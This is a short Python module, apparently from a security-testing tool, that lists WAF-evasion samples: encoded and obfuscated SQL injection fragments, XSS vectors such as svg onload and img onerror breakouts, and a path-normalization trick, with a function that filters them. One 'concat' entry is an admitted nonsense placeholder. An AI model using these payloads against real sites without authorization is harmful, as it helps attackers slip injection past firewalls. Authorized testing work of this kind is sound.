
"""WAF bypass payload samples for authorized testing."""
from __future__ import annotations
from typing import Any

_PAYLOADS = [
    {"id": "case-mix", "payload": "UnIoN SeLeCt", "technique": "case variation"},
    {"id": "comment-inline", "payload": "UN/**/ION/**/SELECT", "technique": "inline comments"},
    {"id": "url-encode", "payload": "%55%4e%49%4f%4e%20%53%45%4c%45%43%54", "technique": "url encode"},
    {"id": "double-url", "payload": "%2555%254e%2549%254f%254e", "technique": "double url encode"},
    {"id": "null-byte", "payload": "UNION%00SELECT", "technique": "null byte"},
    {"id": "whitespace", "payload": "UNION%09SELECT%0aFROM", "technique": "alt whitespace"},
    {"id": "scientific", "payload": "UNION SELECT 1e0", "technique": "scientific notation"},
    {"id": "concat", "payload": "UNIOCATIONON SELLOCATIONECT", "technique": "placeholder - use real concat"},
    {"id": "xss-case", "payload": "<ScRiPt>alert(1)</sCrIpT>", "technique": "xss case"},
    {"id": "xss-svg", "payload": "<svg/onload=alert(1)>", "technique": "xss svg"},
    {"id": "xss-event", "payload": "\"><img src=x onerror=alert(1)>", "technique": "xss breakout"},
    {"id": "path-norm", "payload": "/./admin/../admin", "technique": "path normalization"},
]

def bypass_payloads(kind: str = "all") -> dict[str, Any]:
    kind = (kind or "all").lower()
    rows = _PAYLOADS
    if kind != "all":
        rows = [p for p in rows if kind in p["id"] or kind in p["technique"]]
    return {
        "ok": True,
        "count": len(rows),
        "payloads": rows,
        "engine": "waf",
        "note": "Bypass samples for authorized testing only",
        "equivalent": "wafw00f companion / generic evasion",
    }
